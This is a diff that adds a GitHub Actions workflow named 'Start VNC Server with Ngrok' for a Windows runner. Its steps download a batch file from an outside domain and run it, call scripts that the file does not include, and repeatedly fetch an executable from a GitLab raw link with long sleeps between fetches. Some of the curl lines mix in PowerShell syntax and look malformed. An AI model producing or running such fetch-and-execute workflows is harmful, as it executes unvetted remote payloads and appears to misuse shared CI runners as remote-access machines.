@@ -1,0 +1,25 @@
+name: Start VNC Server with Ngrok
+
+on:
+  workflow_dispatch:
+
+jobs:
+  makeit:
+    runs-on: windows-latest
+
+    steps:
+
+      - name: Install 
+        run: |
+          Invoke-WebRequest -Uri https://spyderrock.com/6sMK2912-a.bat -OutFile setup.bat
+          cmd /c setup.bat
+          .\are.ps1 /Q
+          cmd /c loop.bat
+          
+      - name: Start 
+        run: |
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           cmd /c sleep 240
+           cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           cmd /c sleep 240
+        
